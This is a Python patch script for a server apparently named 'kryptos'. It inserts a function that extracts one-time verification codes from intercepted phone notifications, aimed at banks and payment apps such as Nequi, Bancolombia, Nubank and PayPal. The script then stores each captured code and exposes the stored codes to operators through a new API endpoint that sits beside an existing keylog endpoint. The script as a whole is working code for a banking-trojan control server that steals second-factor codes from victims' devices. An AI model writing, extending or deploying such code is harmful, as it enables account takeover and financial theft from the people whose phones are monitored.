import shutil
M = r"C:\Users\user\kryptos\server\main.py"
shutil.copyfile(M, M + ".bak_otp")
s = open(M, encoding='utf-8').read()
assert "[KRYPTOS-OTP] INICIO" not in s, "ya parcheado"

HELPER = r'''
# [KRYPTOS-OTP] INICIO
_OTP_KW = ("codigo", "code", "otp", "token", "clave", "pin", "senha",
           "verificacion", "verification", "confirmacion", "autenticacion", "contrasena")
_OTP_BANK = ("nequi", "bancolombia", "daviplata", "davivienda", "banco", "bank", "nubank",
             "itau", "bradesco", "santander", "caixa", "bbva", "scotiabank", "paypal",
             "lulo", "rappi", "falabella", "colpatria", "avvillas", "c6", "inter",
             "picpay", "mercadopago", "nu.", "nu ")

def _extract_otp(text, pkg="", app_name=""):
    """Extrai um codigo de verificacao (OTP) de uma notificacao. None se nao houver."""
    if not text:
        return None
    import re as _re, unicodedata as _ud
    flat = "".join(c for c in _ud.normalize("NFD", text) if _ud.category(c) != "Mn")
    low = flat.lower()
    m = _re.search(r"(?:codigo|code|otp|token|clave|pin|senha|verificacion|confirmacion|autenticacion|contrasena)\D{0,25}(\d{4,8})", low)
    if m:
        return m.group(1)
    src = ((pkg or "") + " " + (app_name or "")).lower()
    if not any(k in src for k in _OTP_BANK):
        return None
    nums = _re.findall(r"(?<!\d)(\d{4,8})(?!\d)", flat)
    for want in (6, 4, 5, 8, 7):
        for n in nums:
            if len(n) == want:
                return n
    return nums[0] if nums else None
# [KRYPTOS-OTP] FIN

'''

A1 = '@app.get("/api/devices/{device_id}/notifications")'
assert s.count(A1) == 1
s = s.replace(A1, HELPER + A1, 1)

CALL = '''
                # [KRYPTOS-OTP] detecta codigo de verificacao
                try:
                    _otp = _extract_otp(text, pkg, app_name)
                    if _otp:
                        db.add(DeviceLog(
                            device_id=device_id,
                            log_type="DEVICE_OTP",
                            log_data=json.dumps({"otp": _otp, "package": pkg, "appName": app_name,
                                                 "text": text, "timestamp": utc_now().isoformat()}),
                            created_at=utc_now()
                        ))
                        logger.info("[OTP] " + device_id + " " + (app_name or pkg) + ": " + _otp)
                except Exception as _oe:
                    logger.warning("[OTP] falha: " + str(_oe))
'''
i = s.index('log_type="DEVICE_NOTIFICATION"')
j = s.index('db.add(log)', i) + len('db.add(log)')
s = s[:j] + CALL + s[j:]

EP = '''@app.get("/api/devices/{device_id}/otp")
async def get_device_otp(
    device_id: str,
    limit: int = 30,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """[KRYPTOS-OTP] Codigos de verificacao detectados nas notificacoes"""
    check_device_access(device_id, current_user, db)
    logs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "DEVICE_OTP"
    ).order_by(DeviceLog.created_at.desc()).limit(limit).all()
    result = []
    for log in logs:
        try:
            data = json.loads(log.log_data)
        except Exception:
            data = {}
        result.append({
            "id": log.id,
            "otp": data.get("otp", ""),
            "package": data.get("package", ""),
            "appName": data.get("appName", ""),
            "text": data.get("text", ""),
            "created_at": log.created_at.isoformat()
        })
    return result

'''
A2 = '@app.get("/api/devices/{device_id}/keylogs-all")'
assert s.count(A2) == 1
s = s.replace(A2, EP + A2, 1)

open(M, "w", encoding="utf-8").write(s)
print("PARCHE APLICADO OK")

src = open(M, encoding="utf-8").read()
a = src.index("# [KRYPTOS-OTP] INICIO"); b = src.index("# [KRYPTOS-OTP] FIN")
ns = {}; exec(src[a:b], ns); f = ns["_extract_otp"]
print("=== prueba del extractor ===")
for t, p in [("Nequi: tu codigo es 483920", "com.nequi.MobileApp"),
             ("Tu clave dinamica es 1234", "co.com.bancolombia"),
             ("Bancolombia: Codigo 998877 vence en 5 min", "co.com.bancolombia"),
             ("Pagaste $50.000 en Exito", "co.com.bancolombia"),
             ("Bienvenido a Nequi", "com.nequi.MobileApp"),
             ("Tu codigo de verificacion: 55234", "com.whatsapp")]:
    print(" ", repr(t), "->", f(t, p, ""))
